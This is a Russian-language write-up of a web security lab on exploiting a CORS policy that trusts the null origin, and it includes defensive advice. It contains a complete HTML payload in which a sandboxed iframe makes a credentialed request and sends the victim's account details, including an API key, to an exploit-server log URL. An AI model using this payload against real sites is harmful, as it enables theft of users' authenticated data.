<a id="goal"></a>

## 🎯 Цель

Эксплуатировать неправильно настроенную политику CORS, которая ошибочно доверяет источнику `null`, чтобы:

```text
1. Заставить браузер жертвы сгенерировать кросс-доменный запрос с заголовком Origin: null.
2. Обойти белый список сервера, используя песочницу HTML5 (iframe sandbox).
3. Получить доступ к защищенному эндпоинту (`/accountDetails`) с использованием сессионных cookie жертвы.
4. Эксфильтровать API-ключ администратора на сервер эксплойтов.
```

<a id="theory"></a>

## 🧠 Краткая теория
Когда разработчики внедряют белые списки CORS для предотвращения доступа произвольных доменов к конфиденциальным данным, они иногда включают в них источник `null`. Обычно это ошибка, допущенная для поддержки локальной разработки (например, при открытии HTML-файла прямо с файловой системы с использованием протокола `file:///`, что генерирует источник `null`).

Атакующие могут использовать это, заставив браузер жертвы отправить запрос от источника `null`. Это нельзя сделать, просто перезаписав заголовок `Origin` в JavaScript (браузер блокирует это). Вместо этого используется `iframe` с песочницей. Если iframe помещен в песочницу без атрибута `allow-same-origin`, браузер обрабатывает его содержимое как исходящее из непрозрачного (null) источника.

<a id="idea"></a>

## 🧩 Ключевая идея
Целевой сервер проверяет заголовок `Origin` по белому списку, но ошибочно включает туда `null` и разрешает передачу учетных данных.

```text
Сайт атакующего:    Загружает iframe со строгой песочницей (без allow-same-origin).
Изолированный iframe: Выполняет AJAX-запрос к целевому API.
Браузер жертвы:     Устанавливает Origin запроса в `null` из-за изоляции и прикрепляет куки.
Целевой сервер:     Видит `Origin: null`, находит его в белом списке и отражает в ACAO.
Изолированный iframe: Читает ответ и эксфильтрует его ✅
```

<a id="headers"></a>

## 📡 Уязвимые заголовки
При тестировании эндпоинта с `Origin: null` в Burp Repeater сервер отвечает:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
Это подтверждает, что сервер явно разрешает кросс-доменные запросы от `null` и при этом принимает сессионные куки.

<a id="exploit"></a>

## ⚡ Пейлоад эксплойта
Атакующий использует `iframe` с атрибутом `sandbox` и `srcdoc` для встраивания вредоносного JavaScript.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    // AJAX пейлоад с req.withCredentials = true
</script>"></iframe>
```
Поскольку `allow-same-origin` опущен, браузер изолирует фрейм и принудительно устанавливает источник `null` для исходящих AJAX-запросов.

<a id="step1"></a>

## 🔍 Шаг 1 — Поиск целевого эндпоинта
Авторизуйтесь как тестовый пользователь.
Перейдите на страницу аккаунта и найдите AJAX-запрос к `GET /accountDetails`.

<a id="step2"></a>

## 🔍 Шаг 2 — Тестирование отражения null
Отправьте запрос `/accountDetails` в Burp Repeater.
Измените заголовок источника: `Origin: null`.
Изучите ответ. Наличие `Access-Control-Allow-Origin: null` подтверждает уязвимость.

<a id="step3"></a>

## 🔍 Шаг 3 — Создание эксплойта в песочнице
Откройте Exploit Server.
Оберните стандартный CORS-пейлоад `XMLHttpRequest` в изолированный iframe.
Убедитесь, что JS безопасно кодирует ответ (`encodeURIComponent(this.responseText)`) перед добавлением его к URL эксфильтрации.

<a id="step4"></a>

## 🔍 Шаг 4 — Отправка эксплойта жертве
Сохраните эксплойт и доставьте его жертве.
Проверьте Access Log на сервере эксплойтов, чтобы извлечь API-ключ администратора из строки запроса URL.

<a id="examples"></a>

## 📨 Пример HTML-пейлоада
Пейлоад (Раздел Body на сервере эксплойтов)
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

<a id="attack-chain"></a>

## 🧾 Полная цепочка атаки
```text
1. Определение эндпоинта извлечения данных (`/accountDetails`).
2. Тестирование эндпоинта в Repeater путем отправки `Origin: null`.
3. Подтверждение того, что сервер возвращает `ACAO: null` и разрешает учетные данные.
4. Создание iframe-пейлоада с использованием `sandbox="allow-scripts allow-top-navigation allow-forms"`.
5. Внедрение XHR-пейлоада внутрь `srcdoc` фрейма.
6. Обеспечение URL-кодирования для эксфильтрации данных (`encodeURIComponent`).
7. Доставка пейлоада жертве, заставляя её браузер отправить запрос от источника `null`.
8. Извлечение украденного API-ключа из логов сервера.
```

<a id="breakdown"></a>

## 🔬 Почему атака сработала
1. Доверие к `null`
Разработчик ошибочно включил `null` в белый список CORS, скорее всего, оставив конфигурацию, используемую для локального тестирования.

2. Поведение HTML5 Sandbox
Злоумышленник успешно злоупотребил функцией песочницы iframe в HTML5, чтобы заставить современный браузер жертвы действовать как непрозрачный (`null`) источник, что идеально совпало с ошибочным белым списком сервера.

<a id="pentester"></a>

## 🧠 Как думать как пентестер
При оценке конфигураций CORS:

```text
Если сервер блокирует произвольные домены (например, `evil.com`), не думайте, что он безопасен. Всегда тестируйте крайние случаи, такие как `Origin: null`.
Если `null` разрешен с учетными данными, защита полностью обходится с помощью песочницы iframe.
```

<a id="mistakes"></a>

## ❌ Типичные ошибки
Ошибка 1. Добавление `allow-same-origin` в песочницу
Если вы напишете `sandbox="allow-scripts allow-same-origin"`, браузер будет использовать фактический домен сервера эксплойтов в качестве источника (Origin), и атака не удастся, поскольку целевой сервер внес в белый список только `null`.

Ошибка 2. Забытое URL-кодирование
JSON содержит такие символы, как `{`, `"` и пробелы. Без `encodeURIComponent` браузер может усечь или исказить URL при попытке перенаправления, что приведет к неполным данным в логах доступа.

<a id="defense"></a>

## 🛡 Защита
1. Никогда не доверяйте `null`
Никогда не включайте `null` в белый список CORS `Access-Control-Allow-Origin`.

2. Правильные рабочие процессы разработки
Используйте локальные веб-серверы (например, `localhost`) для разработки и тестирования вместо использования протокола `file:///`.

<a id="conclusion"></a>

## 🧾 Итог
Лаборатория продемонстрировала, что включение источника `null` в белый список так же опасно, как и отражение произвольных источников:

```text
1. Доказано, что функции современных браузеров (iframe sandbox) могут быть использованы для генерации непрозрачных источников.
2. Успешно обойден белый список CORS для кражи аутентифицированных данных.
```
